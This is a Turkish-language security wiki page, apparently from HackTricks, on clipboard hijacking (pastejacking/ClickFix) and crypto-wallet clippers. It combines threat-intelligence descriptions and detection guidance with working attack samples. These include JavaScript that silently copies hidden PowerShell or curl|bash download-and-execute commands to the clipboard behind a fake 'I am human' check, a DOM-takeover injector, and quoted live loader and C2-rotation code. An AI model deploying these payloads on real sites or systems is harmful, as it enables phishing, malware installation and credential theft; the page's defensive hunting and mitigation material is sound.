# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Kendinizin kopyalamadığı hiçbir şeyi asla yapıştırmayın." – eski ama hâlâ geçerli bir tavsiye

## Genel Bakış

Clipboard hijacking – *pastejacking* olarak da bilinir – kullanıcıların komutları incelemeden rutin olarak kopyalayıp yapıştırması gerçeğini kötüye kullanır. Kötü amaçlı bir web sayfası (veya Electron ya da Desktop application gibi JavaScript destekli herhangi bir context), saldırgan tarafından kontrol edilen metni programatik olarak sistem panosuna yerleştirir. Mağdurlar, genellikle özenle hazırlanmış social-engineering talimatlarıyla **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) tuşlarına basmaya ya da bir terminal açıp panodaki içeriği *yapıştırmaya* teşvik edilir; böylece arbitrary commands hemen çalıştırılır.

**Herhangi bir dosya indirilmediği ve hiçbir attachment açılmadığı** için bu teknik, attachment'ları, macro'ları veya doğrudan command execution'ı izleyen çoğu e-mail ve web-content security kontrolünü bypass eder. Bu nedenle saldırı, NetSupport RAT, Latrodectus loader veya Lumma Stealer gibi commodity malware family'lerini dağıtan phishing campaign'lerinde popülerdir.<sup>[[1]](#references)</sup>

## Wallet-address replacement clippers

Bir başka **clipboard hijacking** çeşidi hiç command paste etmez: mağdurun bir **cryptocurrency wallet address** kopyalamasını bekler, ardından paste işleminden hemen önce bunu sessizce saldırgan tarafından kontrol edilen başka bir adresle değiştirir. Bu yöntem, kullanıcılar genellikle yalnızca ilk ve son karakterleri doğruladığından uzun wallet format'larına karşı özellikle etkilidir.<sup>[[8]](#references)</sup>

Yaygın gerçek dünya özellikleri:
- **Thin loader + nested payload**: görünür app/exe meşru bir trading veya "profit" tool'u gibi görünürken gerçek clipper bundle'ın daha derinlerinde gizlenir (örneğin nested bir Rust payload başlatan bir .NET loader).
- **Regex-driven replacement**: malware `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` gibi string'leri veya genel **44-character Solana-like** string'leri eşleştirir ve bunları saldırganın wallet'larıyla değiştirir.
- **Wallet rotation at scale**: modern Windows samples, her currency için tek bir static address yerine **binlerce** replacement wallet içerebilir; bu da her theft sonrasında wallet reputation kaybını azaltır.<sup>[[8]](#references)</sup>

### Windows clipper flow

Yaygın bir implementation, **`AddClipboardFormatListener`** ile register edilmiş hidden bir window'dur. Her clipboard update işleminde malware genellikle şunları çağırır:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → mevcut clipboard data'ya erişir.
- **`GetClipboardData`** → text'i okur.
- **`EmptyClipboard`** + **`SetClipboardData`** → wallet string'ini attacker value ile değiştirir.

Clippers'ta sıklıkla görülen minimal hunting regex'leri:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Kullanıcı düzeyinde persistence, etki yaratmak için yeterlidir. Gözlemlenen kalıplardan biri şöyledir:<sup>[[8]](#references)</sup>
- Payload'u **`%APPDATA%\silke\silke.exe`** konumuna kopyalama
- **Startup-folder LNK** dosyasını `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` altında oluşturma

Tespit fikirleri:
- Clipboard API'lerini sürekli çağırırken aynı zamanda `%APPDATA%` ve kullanıcının **Startup** klasörüne yazan process'ler.
- Yeni LNK/executable oluşturulmasının ardından wallet-address clipboard yeniden yazımları.
- Kullanılmayan çok sayıda dosya ile iç içe bir binary'yi başlatan küçük bir launcher içeren arşivler veya sahte-software paketleri.

### macOS social-engineered quarantine removal + LaunchAgent persistence

macOS'ta bazı campaign'ler bir **`unlocker.command`** helper'ı gönderir ve Gatekeeper uygulamanın hasarlı olduğunu veya unidentified developer tarafından geldiğini bildirirse kurbana sağ tıklayıp → **Open** seçeneğine tıklamasını söyler. Script, quarantine'i kaldırıp yakındaki `.app` dosyasını başlatır:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Bu bir **Gatekeeper exploit'i** değildir; Gatekeeper kararlarının `com.apple.quarantine` xattr'ına bağlı olmasından yararlanan **social-engineered bir quarantine bypass** yöntemidir.<sup>[[8]](#references)</sup>

Çalıştırıldıktan sonra clipper, aşağıdakileri yazarak mevcut kullanıcı olarak persistence sağlayabilir:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – `RunAtLoad` ve `KeepAlive` içeren LaunchAgent

Savunma açısından önemli bir ayrıntı, bazı sample'ların yaklaşık her 30 saniyede bir LaunchAgent'i ve wrapper'ı yeniden yazan **self-healing watchdog** uygulamasıdır. Çalışan process'i **sonlandırmadan** önce plist'i kaldırırsanız malware plist'i hemen yeniden oluşturabilir.<sup>[[8]](#references)</sup> Güvenli cleanup sırası:
1. Aktif clipper process'ini kill edin.
2. LaunchAgent plist'ini unload/delete edin.
3. `~/launch.sh` dosyasını ve kopyalanan payload'ı silin.

### Delivery note: fake reputation as a force multiplier

Bu family için malware teknik açıdan basit kalabilir; asıl işi **distribution layer** üstlenir: binary'nin execution öncesinde güvenilir görünmesini sağlamak için fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views ve zararsız görünen VirusTotal comments/votes kullanılır.<sup>[[8]](#references)</sup>

## Zorunlu copy buttons ve gizli payload'lar (macOS one-liners)

Bazı macOS infostealer'ları installer sitelerini (ör. Homebrew) clone eder ve kullanıcıların yalnızca görünür metni highlight etmesini engellemek için **“Copy” button kullanımını zorunlu kılar**. Clipboard entry, beklenen installer command'ini ve eklenmiş bir Base64 payload'ı (ör. `...; echo <b64> | base64 -d | sh`) içerir; böylece tek bir paste her ikisini de execute ederken UI ekstra stage'i gizler.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Daha eski kampanyalarda `document.execCommand('copy')` kullanılırken, daha yeni kampanyalar asenkron **Clipboard API**'ye (`navigator.clipboard.writeText`) dayanır.<sup>[[2]](#references)</sup>

## ClickFix / ClearFake Akışı

1. Kullanıcı typosquatting uygulanmış veya ele geçirilmiş bir siteyi ziyaret eder (ör. `docusign.sa[.]com`)
2. Enjekte edilmiş **ClearFake** JavaScript'i, Base64 kodlamalı bir PowerShell one-liner'ını kullanıcının haberi olmadan clipboard'a kaydeden `unsecuredCopyToClipboard()` helper'ını çağırır.
3. HTML talimatları kurbana şunları söyler: *“Sorunu çözmek için **Win + R** tuşlarına basın, komutu yapıştırın ve Enter'a basın.”*
4. `powershell.exe`, meşru bir executable ile kötü amaçlı bir DLL içeren bir archive indirir ve çalıştırır (klasik DLL sideloading).
5. Loader ek aşamaların şifresini çözer, shellcode enjekte eder ve persistence kurar (ör. scheduled task) – sonuç olarak NetSupport RAT / Latrodectus / Lumma Stealer çalıştırılır.<sup>[[1]](#references)</sup>

### Örnek NetSupport RAT Zinciri
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (meşru Java WebStart), `msvcp140.dll` için kendi dizininde arama yapar.
* Kötü amaçlı DLL, **GetProcAddress** ile API'leri dinamik olarak çözümler, **curl.exe** aracılığıyla iki binary (`data_3.bin`, `data_4.bin`) indirir, bunların şifresini dönen XOR anahtarı `"https://google.com/"` kullanarak çözer, son shellcode'u inject eder ve **client32.exe** (NetSupport RAT) dosyasını `C:\ProgramData\SecurityCheck_v1\` konumuna zip'ten çıkarır.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe** ile `la.txt` indirir
2. **cscript.exe** içinde JScript downloader'ı çalıştırır
3. Bir MSI payload'u alır → imzalı bir uygulamanın yanına `libcef.dll` bırakır → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### MSHTA aracılığıyla Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** çağrısı, gizli bir PowerShell script'i başlatarak `PartyContinued.exe` dosyasını indirir, `Boat.pst` (CAB) dosyasını çıkarır, `extrac32` ve dosya birleştirme yoluyla `AutoIt3.exe` dosyasını yeniden oluşturur ve son olarak tarayıcı kimlik bilgilerini `sumeriavgv.digital` adresine exfiltrate eden bir `.a3x` script'i çalıştırır.<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Rotating C2 içeren Startup LNK (PureHVNC)

Bazı ClickFix campaign'leri dosya indirmeyi tamamen atlar ve kurbanlara WSH üzerinden JavaScript'i alıp çalıştıran, kalıcılık sağlayan ve C2'yi her gün değiştiren tek satırlık bir komut yapıştırmalarını söyler. Gözlemlenen örnek zincir:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Temel özellikler
- Casual inspection'ı engellemek için çalışma zamanında tersine çevrilen obfuscated URL.
- JavaScript, bir Startup LNK (WScript/CScript) aracılığıyla kendini kalıcı hale getirir ve geçerli güne göre C2'yi seçer; bu da hızlı domain rotation sağlar.<sup>[[3]](#references)</sup>

C2'leri tarihe göre rotate etmek için kullanılan minimal JS fragment:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Sonraki aşamada genellikle persistence sağlayan ve bir RAT (ör. PureHVNC) indiren bir loader deploy edilir; bu loader çoğunlukla TLS'i hardcoded bir sertifikaya pinler ve trafiği parçalara böler.<sup>[[3]](#references)</sup>

Bu varyanta özgü detection fikirleri
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (veya `cscript.exe`).
- Startup artifact'ları: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` altında, `%TEMP%`/`%APPDATA%` altında bulunan bir JS path'i ile WScript/CScript'i çalıştıran LNK.
- `.split('').reverse().join('')` veya `eval(a.responseText)` içeren Registry/RunMRU ve command-line telemetry.
- Uzun command line'lar kullanmadan uzun script'leri beslemek için büyük stdin payload'larıyla tekrarlanan `powershell -NoProfile -NonInteractive -Command -`.
- Bir updater'a benzeyen task/path altında LOLBins'i (ör. `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`) sonradan çalıştıran Scheduled Tasks (ör. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Günlük olarak değişen C2 hostname'leri ve `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern'ine sahip URL'ler.
- Clipboard write event'lerini, ardından gelen Win+R paste işlemi ve hemen sonrasındaki `powershell.exe` execution ile correlate edin.

Blue team'ler, pastejacking abuse vakalarını belirlemek için clipboard, process-creation ve registry telemetry'yi birlikte kullanabilir:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`, **Win + R** command'larının geçmişini tutar; alışılmadık Base64 / obfuscated entry'leri arayın.
* `ParentImage` == `explorer.exe` ve `NewProcessName` { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } kümesinde olduğunda Security Event ID **4688** (Process Creation).
* Şüpheli 4688 event'inden hemen önce `%LocalAppData%\Microsoft\Windows\WinX\` veya temporary folder'lar altında gerçekleşen file creation'lar için Event ID **4663**.
* EDR clipboard sensor'ları (mevcutsa) – `Clipboard Write` event'ini hemen ardından yeni bir PowerShell process'i gelmesiyle correlate edin.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Recent campaign'ler, kullanıcıları OS-specific command'ları clipboard'larından native console'lara kopyalamaya zorlayan sahte CDN/browser verification page'lerini ("Just a moment…", IUAM-style) kitlesel olarak üretir. Bu yöntem execution'ı browser sandbox dışına taşır ve Windows ile macOS genelinde çalışır.<sup>[[4]](#references)</sup>

Builder-generated page'lerin temel özellikleri
- Payload'ları uyarlamak için `navigator.userAgent` üzerinden OS detection (Windows PowerShell/CMD ile macOS Terminal arasında seçim). İllüzyonu korumak için desteklenmeyen OS'ler için optional decoy/no-op'lar.
- Zararsız UI action'ları (checkbox/Copy) sırasında automatic clipboard-copy; görünür text, clipboard içeriğinden farklı olabilir.
- Mobile blocking ve adım adım talimatlar içeren bir popover: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Ele geçirilmiş bir site'nin DOM'unu Tailwind-styled verification UI ile overwrite eden optional obfuscation ve single-file injector (yeni domain registration'ı gerekmez).<sup>[[4]](#references)</sup>

Örnek: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS'ta ilk çalıştırmanın kalıcılığı
- Terminal kapandıktan sonra yürütmenin devam etmesi ve görünür izlerin azaltılması için `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` kullanın.<sup>[[4]](#references)</sup>

Ele geçirilmiş sitelerde yerinde sayfa devralma
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
IUAM tarzı lures için özel detection ve hunting fikirleri
- Web: Clipboard API'yi verification widget'larına bağlayan sayfalar; görüntülenen metin ile clipboard payload arasındaki uyumsuzluk; `navigator.userAgent` dallanması; şüpheli bağlamlarda Tailwind + single-page replace.
- Windows endpoint: Bir browser etkileşiminden kısa süre sonra `explorer.exe` → `powershell.exe`/`cmd.exe`; `%TEMP%` konumundan çalıştırılan batch/MSI installer'ları.
- macOS endpoint: Browser event'lerinin yakınında Terminal/iTerm'in `bash`/`curl`/`base64 -d` başlatması; terminal kapatıldıktan sonra da çalışan background job'lar.
- `RunMRU` Win+R geçmişini ve clipboard write işlemlerini, ardından oluşturulan console process'leri ile ilişkilendirin.

Destekleyici teknikler için ayrıca bkz.

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 sahte CAPTCHA / ClickFix evrimleri (ClearFake, Scarlet Goldfinch)

- ClearFake, WordPress sitelerini compromise etmeye ve external host'ları (Cloudflare Workers, GitHub/jsDelivr) zincirleyen loader JavaScript enjekte etmeye devam ediyor; ayrıca güncel lure logic'i çekmek için blockchain “etherhiding” çağrılarını (ör. `bsc-testnet.drpc[.]org` gibi Binance Smart Chain API endpoint'lerine POST'lar) bile kullanıyor. Güncel overlay'ler, herhangi bir şey indirmek yerine kullanıcıları tek satırlık bir komutu kopyalayıp yapıştırmaya (T1204.004) yönlendiren sahte CAPTCHA'ları yoğun biçimde kullanıyor.<sup>[[6]](#references)</sup>
- Initial execution giderek signed script host'lara/LOLBAS'a devrediliyor. Ocak 2026 chain'lerinde, daha önceki `mshta` kullanımı yerine `WScript.exe` aracılığıyla çalıştırılan yerleşik `SyncAppvPublishingServer.vbs` kullanıldı; remote content çekmek için alias/wildcard içeren PowerShell benzeri argümanlar geçirildi:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` imzalıdır ve normalde App-V tarafından kullanılır; `WScript.exe` ile birlikte kullanıldığında ve alışılmadık argümanlar (`gal`/`gcm` alias'ları, wildcard içeren cmdlet'ler, jsDelivr URL'leri) barındırdığında ClearFake için yüksek sinyalli bir LOLBAS aşamasına dönüşür.<sup>[[6]](#references)</sup>
- Şubat 2026'da sahte CAPTCHA payload'ları yeniden saf PowerShell download cradle'larına kaydı. Canlı iki örnek:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- İlk zincir bellek içi bir `iex(irm ...)` grabber'ıdır; ikincisi `WinHttp.WinHttpRequest.5.1` üzerinden stage eder, geçici bir `.ps1` yazar ve ardından gizli bir pencerede `-ep bypass` ile çalıştırır.<sup>[[6]](#references)</sup>

Bu varyantlar için tespit/hunting ipuçları
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` veya clipboard yazma/Win+R işlemlerinin hemen ardından PowerShell cradles.
- Command-line anahtar kelimeleri: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains veya ham IP `iex(irm ...)` pattern'leri.
- Network: web browsing sonrasında kısa süre içinde script host'ları/PowerShell tarafından CDN worker host'larına veya blockchain RPC endpoint'lerine yapılan outbound bağlantılar.
- File/registry: `%TEMP%` altında geçici `.ps1` oluşturulması ve bu one-liner'ları içeren RunMRU entries; external URL'lerle veya obfuscated alias string'lerle çalıştırılan signed-script LOLBAS (WScript/cscript/mshta) için block/alert uygulayın.

## Haziran 2026 ClickFix tradecraft: paste telemetry, sahte verification yorumları ve LOLBin chaining

Recent Red Canary telemetry, sabit indicator'ın **tek bir exact command olmadığını**; bunun yerine **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval** ve **immediate execution** kombinasyonu olduğunu gösteriyor.<sup>[[7]](#references)</sup>

### Dikkat çeken operator pattern'leri

- **Paste confirmation telemetry**: bazı payload'lar gerçek stage'den önce `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` çalıştırır. Bu, pencereyi kısa ve sessiz tutarken user interaction'ı doğrular.
- **Fake verification comments**: PowerShell one-liner'ları `# Security check ✔️ I'm not a robot Verification ID: 138105` gibi string'ler ekleyebilir; böylece command, Run / `cmd.exe` / PowerShell history'ye paste edildikten sonra hâlâ CAPTCHA ile ilişkili görünür.
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` command line'da static URL bulunmasını engellerken bellek içi download-and-execute işlemini sürdürür.
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q`, kırılgan detection'ları atlatmak için flag'lerde unusual casing ve Unicode-like characters kullanır; aynı zamanda `msiexec.exe`'ye benzemeye devam eder.
- **Caret-escaped LOLBin chains**: `cmd.exe`, `^` escapes ile keyword'leri gizleyebilir (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), nested shell'i minimized olarak başlatabilir, attacker content'i `.pdf` gibi benign bir extension ile kaydedebilir ve ardından bunu `mshta` üzerinden çalıştırabilir.<sup>[[7]](#references)</sup>
## Mitigations

1. Browser hardening – clipboard write-access'i (`dom.events.asyncClipboard.clipboardItem` vb.) devre dışı bırakın veya user gesture gerektirin.
2. Security awareness – kullanıcılara sensitive command'ları *type etmeyi* veya önce bir text editor'e paste etmeyi öğretin.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control kullanarak arbitrary one-liner'ları block edin.
4. Network controls – bilinen pastejacking ve malware C2 domain'lerine yapılan outbound request'leri block edin.

## Related Tricks

* **Discord Invite Hijacking**, kullanıcıları malicious bir server'a çekmenin ardından sıklıkla aynı ClickFix approach'u abuse eder:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
